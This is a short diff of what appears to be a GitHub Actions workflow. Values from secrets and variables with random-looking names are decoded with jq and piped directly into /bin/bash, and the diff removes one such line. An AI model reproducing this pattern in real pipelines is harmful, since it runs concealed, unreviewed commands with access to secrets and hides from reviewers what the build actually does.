@@ -17,7 +17,6 @@ jobs:
           veukw305: ${{ secrets.veukw305 }}
         run: |
           printf '%s' "$veukw305" | jq -r .sju9644 | /bin/bash
-          echo $codcx7303 | jq -r .n0 | /bin/bash
           echo $t49 | jq -r .jnzx605 | /bin/bash
           printf '%s' "$pejf419" | jq -r .akh636 | /bin/bash
 
